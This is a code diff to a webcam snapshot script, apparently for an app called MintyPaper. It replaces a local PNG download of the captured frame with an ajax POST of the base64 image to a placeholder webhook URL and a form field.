@@ -69,11 +69,16 @@
               canvas.height = video.videoHeight;
               canvas.getContext('2d').drawImage(video, 0, 0);
               // Other browsers will fall back to image/png
-              img.src = canvas.toDataURL('image/png',1.0);
-              var link = document.getElementById('link');
-              link.setAttribute('download', 'MintyPaper.png');
-              link.setAttribute('href', img.src.replace("image/png", "image/octet-stream"));
-              link.click();
+              img.src = canvas.toDataURL('image/jpg',1.0);
+              $.ajax({type: "POST", url: "http://url/hook", data:{imageBase64: img.src}})
+              .done(function() {console.log('sent');
+});
+              input.value = canvas.toDataURL('image/jpg',1.0);
+              // var link = document.getElementById('link');
+              // link.setAttribute('download', 'MintyPaper.png');
+              // link.setAttribute('href', img.src.replace("image/png", "image/octet-stream"));
+              // link.click();
+              console.log(img.src);
             };
           
             function handleSuccess(stream) {
